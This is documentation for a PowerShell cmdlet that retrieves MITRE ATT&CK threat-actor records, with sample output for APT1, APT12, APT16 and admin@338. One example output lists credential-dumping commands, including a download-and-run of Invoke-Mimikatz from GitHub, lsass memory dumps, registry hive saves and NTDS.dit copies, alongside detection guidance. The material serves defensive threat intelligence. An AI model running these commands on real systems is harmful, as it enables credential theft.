# SYNOPSIS
    
Get-AttckActor gives the user access to all Actors of Groups defined within the MITRE ATT&CK framework

## DESCRIPTION

Get-AttckActor can access all Actors of Groups defined within the MITRE ATT&CK framework.
You can also select a single Actor by providing a Name value

## PARAMETERS

### PARAMETER Name

A argument completer parameter to retrieve data about a specific Actor by Name

## EXAMPLES

### EXAMPLE Access All Actor Information

```powershell
C:/> Get-AttckActor
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0006
Name               : APT1
Aliases            : APT1 Comment Crew Comment Group Comment Panda
Description        : [APT1](https://attack.mitre.org/groups/G0006) is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation 
                     Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. (Citation: 
                     Mandiant APT1)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0006; ExternalId=G0006; SourceName=mitre-attack}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=APT1}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=Comment Crew}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=Comment Group}…}
Created            : 05/31/2017 21:31:47
Modified           : 08/20/2019 13:08:12
Stix               : intrusion-set--6a2e693f-24e5-451a-9f88-b36a108e5662
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0006
Contributor        : 

CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0005
Name               : APT12
Aliases            : APT12 IXESHE DynCalc Numbered Panda DNSCALC
Description        : [APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. The group has targeted a variety of victims 
                     including but not limited to media outlets, high-tech companies, and multiple governments.(Citation: Meyers Numbered Panda)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0005; ExternalId=G0005; SourceName=mitre-attack}, 
                     @{Description=(Citation: Meyers Numbered Panda) (Citation: Moran 2014); Url=No url attribute found; ExternalId=No external_id attribute found; 
                     SourceName=APT12}, @{Description=(Citation: Meyers Numbered Panda) (Citation: Moran 2014); Url=No url attribute found; ExternalId=No external_id 
                     attribute found; SourceName=IXESHE}, @{Description=(Citation: Meyers Numbered Panda) (Citation: Moran 2014); Url=No url attribute found; 
                     ExternalId=No external_id attribute found; SourceName=DynCalc}…}
Created            : 05/31/2017 21:31:47
Modified           : 06/10/2019 19:28:00
Stix               : intrusion-set--c47f937f-1022-4f42-8525-e7a4779a14cb
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0005
Contributor        : 

CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0023
Name               : APT16
Aliases            : APT16
Description        : [APT16](https://attack.mitre.org/groups/G0023) is a China-based threat group that has launched spearphishing campaigns targeting Japanese and 
                     Taiwanese organizations. (Citation: FireEye EPS Awakens Part 2)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0023; ExternalId=G0023; SourceName=mitre-attack}, 
                     @{Description=(Citation: FireEye EPS Awakens Part 2); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=APT16}, 
                     @{Description=Winters, R.. (2015, December 20). The EPS Awakens - Part 2. Retrieved January 22, 2016.; 
                     Url=https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html; ExternalId=No external_id attribute found; 
                     SourceName=FireEye EPS Awakens Part 2}}
Created            : 05/31/2017 21:31:56
Modified           : 03/22/2019 14:20:45
Stix               : intrusion-set--d6e88e18-81e8-4709-82d8-973095da1e70
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0023
Contributor        : 

....
```

### EXAMPLE Retrieve a specific Actor by Name

```powershell
C:/> Get-AttckActor -Name 'APT1'
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0006
Name               : APT1
Aliases            : APT1 Comment Crew Comment Group Comment Panda
Description        : [APT1](https://attack.mitre.org/groups/G0006) is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation 
                     Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. (Citation: 
                     Mandiant APT1)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0006; ExternalId=G0006; SourceName=mitre-attack}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=APT1}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=Comment Crew}, 
                     @{Description=(Citation: Mandiant APT1); Url=No url attribute found; ExternalId=No external_id attribute found; SourceName=Comment Group}…}
Created            : 05/31/2017 21:31:47
Modified           : 08/20/2019 13:08:12
Stix               : intrusion-set--6a2e693f-24e5-451a-9f88-b36a108e5662
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0006
Contributor        : 
```

### EXAMPLE Retrieve a specific Actors Techniques

```powershell
C:/> (Get-AttckActor -Name 'APT1').Techniques()
```

```output
CreatedByReference   : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Platform             : {Windows, Linux, macOS}
Permission           : {Administrator, SYSTEM, root}
Bypass               : {}
EffectivePermissions : {}
CommandList          : {hashdump
                       mimikatz !lsadump::sam hashdump
                       run hashdump
                       run smart_hashdump
                       post/windows/gather/credentials/domain_hashdump logonpasswords
                       mimikatz !sekurlsa::logonpasswords
                       mimikatz !sekurlsa::msv
                       mimikatz !sekurlsa::kerberos
                       mimikatz !sekurlsa::wdigest use mimikatz
                       wdigest
                       msv
                       kerberos
                       logonpasswords IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3
                       ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
                        gsecdump -a
                        wce -o output.txt
                        reg save HKLM\sam "C:\Windows\Temp\sam"
                       reg save HKLM\system "C:\Windows\Temp\system"
                       reg save HKLM\security "C:\Windows\Temp\security"
                        $PathToAtomicsFolder\T1003\bin\procdump64.exe -accepteula -ma lsass.exe #{output_file}
                        $PathToAtomicsFolder\T1003\bin\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
                        $PathToAtomicsFolder\T1003\bin\mimikatz.exe "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
                        $PathToAtomicsFolder\T1003\bin\mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass_dump.dmp" "sekurlsa::logonpasswords full" exit
                        ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp" q q
                        vssadmin.exe create shadow /for=C:
                        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
                       copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
                       reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
                        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
                       copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
                       reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
                        findstr /S cpassword %logonserver%\sysvol\*.xml
                        . $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
                       Get-GPPPassword -Verbose
                        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
                       Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "#{output_folder}\sam"
                       Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
                       Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
                        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
                       Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "#{output_folder}\sam"
                       Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
                       Invoke-NinjaCopy -Path "C:\Windows\System32\config\security" -LocalDestination "#{output_folder}\security"
                        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
                       Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
                       Invoke-NinjaCopy -Path "C:\Windows\System32\config\system" -LocalDestination "#{output_folder}\system"
                       Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
                        . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
                       Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "C:\Windows\Temp\sam"
                       Invoke-NinjaCopy -Path "C:\Windows\System32\config\system" -LocalDestination "C:\Windows\Temp\system"
                       Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "C:\Windows\Temp\security"
                              ntdsutil.exe \\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security 
                       \\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll}
Commands             : {                              }
Queries              : {                                                                                                                                               
                                                                }
Datasets             : {          }
Detections           : {$null}
Network              : No x_mitre_network_requirements attribute found
Remote               : No x_mitre_remote_support attribute found
SystemRequirements   : No x_mitre_system_requirements attribute found
Detection            : ### Windows
                       Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common 
                       credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the 
                       process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also 
                       use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.
                       
                       Hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the 
                       Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM 
                       table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid 
                       Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. 
                       
                       On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.
                       
                       Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may 
                       contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). 
                       [PowerShell](https://attack.mitre.org/techniques/T1086) scripts also exist that contain credential dumping functionality, such as PowerSploit's 
                       Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to 
                       collect necessary information for analysis.
                       
                       Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft 
                       DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests 
                       originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: 
                       Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated 
                       with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)
                       
                       ### Linux
                       To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. 
                       This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being 
                       interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for 
                       hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.
DataSource           : {API monitoring, Process monitoring, PowerShell logs, Process command-line parameters}

...
```

### EXAMPLE Showing External Dataset

```powershell
C:/> Get-AttckActor -Name 'admin@338'
```


```output
Dataset             : {@{operations=System.Object[]; comment=“PdPD” (50 64 50 44) marker for encrypted binaries; attck_id=; 
                      names=System.Object[]; links=System.Object[]; tools=System.Object[]; targets=Target Gov + Military, DIB, Finiancial/Think 
                      Tanks, Telco, Academia, Religious organisations; description=}}
Operations          : {admin@338}
AttributionLinks    : {https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html 
                      https://www.fireeye.com/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html 
                      https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html}
KnownTools          : {Poison Ivy jRat LOWBALL BUBBLEWRAP}
Targets             : {Target Gov + Military, DIB, Finiancial/Think Tanks, Telco, Academia, Religious organisations}
AdditionalComments  : {“PdPD” (50 64 50 44) marker for encrypted binaries}
ExternalDescription : {}
CreatedByReference  : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked             : No revoked attribute found
Country             : china
Id                  : G0018
Name                : admin@338
Aliases             : admin@338
Description         : [admin@338](https://attack.mitre.org/groups/G0018) is a China-based cyber threat group. It has previously used newsworthy 
                      events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade 
                      policy, typically using publicly available RATs such as [PoisonIvy](https://attack.mitre.org/software/S0012), as well as 
                      some non-public backdoors. (Citation: FireEye admin@338)
Reference           : {@{ExternalId=G0018; Url=https://attack.mitre.org/groups/G0018; Description=No description attribute found; 
                      SourceName=mitre-attack}, @{ExternalId=No external_id attribute found; Url=No url attribute found; Description=(Citation: 
                      FireEye admin@338); SourceName=admin@338}, @{ExternalId=No external_id attribute found; 
                      Url=https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html; Description=FireEye Threat 
                      Intelligence. (2015, December 1). China-based Cyber Threat Group Uses Dropbox for Malware Communications and Targets Hong 
                      Kong Media Outlets. Retrieved December 4, 2015.; SourceName=FireEye admin@338}}
Created             : 05/31/2017 21:31:53
Modified            : 09/04/2019 19:48:17
Stix                : intrusion-set--16ade1aa-0ea1-4bb7-88cc-9079df2ae756
Type                : intrusion-set
Wiki                : https://attack.mitre.org/groups/G0018
Contributor         : Tatsuya Daitoku, Cyber Defense Institute, Inc.
```

### EXAMPLE Retrieve a specific Actors Malware

```powershell
C:/> (Get-AttckActor -Name 'APT1').Malwares()
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Label              : {malware}
Platform           : {Windows}
Id                 : S0025
Name               : CALENDAR
Aliases            : 
Description        : [CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail 
                     Calendar traffic. (Citation: Mandiant APT1)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0025; ExternalId=S0025; SourceName=mitre-attack}, 
                     @{Description=Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.; 
                     Url=https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf; ExternalId=No external_id attribute found; 
                     SourceName=Mandiant APT1}}
Created            : 05/31/2017 21:32:20
Modified           : 01/30/2019 15:39:45
Stix               : malware--5a84dc36-df0d-4053-9b7c-f0c388a57283
Type               : malware
Wiki               : https://attack.mitre.org/software/S0025
Contributor        : 

CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Label              : {malware}
Platform           : {Windows}
Id                 : S0026
Name               : GLOOXMAIL
Aliases            : 
Description        : [GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate 
                     Jabber/XMPP traffic. (Citation: Mandiant APT1)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0026; ExternalId=S0026; SourceName=mitre-attack}, 
                     @{Description=Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.; 
                     Url=https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf; ExternalId=No external_id attribute found; 
                     SourceName=Mandiant APT1}}
Created            : 05/31/2017 21:32:20
Modified           : 10/17/2018 00:14:20
Stix               : malware--f2e8c7a1-cae1-45c4-baf0-6f21bdcbb2c2
Type               : malware
Wiki               : https://attack.mitre.org/software/S0026
Contributor        : 

...
```

### EXAMPLE Retrieve a specific Actors Tools

```powershell
C:/> (Get-AttckActor -Name 'APT1').Tools()
```

```output
Id          : S0006
Name        : pwdump
Aliases     : 
Description : [pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)
Reference   : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0006; ExternalId=S0006; SourceName=mitre-attack}, 
              @{Description=Wikipedia. (1985, June 22). pwdump. Retrieved June 22, 2016.; Url=https://en.wikipedia.org/wiki/Pwdump; ExternalId=No external_id 
              attribute found; SourceName=Wikipedia pwdump}}
Created     : 05/31/2017 21:32:13
Modified    : 10/17/2018 00:14:20
Stix        : tool--9de2308e-7bed-43a3-8e58-f194b3586700
Type        : tool
Wiki        : https://attack.mitre.org/software/S0006
Contributor : 

Id          : S0057
Name        : Tasklist
Aliases     : 
Description : The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks 
              running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. 
              (Citation: Microsoft Tasklist)
Reference   : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0057; ExternalId=S0057; SourceName=mitre-attack}, 
              @{Description=Microsoft. (n.d.). Tasklist. Retrieved December 23, 2015.; Url=https://technet.microsoft.com/en-us/library/bb491010.aspx; ExternalId=No 
              external_id attribute found; SourceName=Microsoft Tasklist}}
Created     : 05/31/2017 21:32:39
Modified    : 10/17/2018 00:14:20
Stix        : tool--2e45723a-31da-4a7e-aaa6-e01998a6788f
Type        : tool
Wiki        : https://attack.mitre.org/software/S0057
Contributor : 

...
```

## OUTPUTS

PSAttck.Enterprise.Actor

## NOTES

Created By: Josh Rickard (MSAdministrator)
Date: 21JAN2020
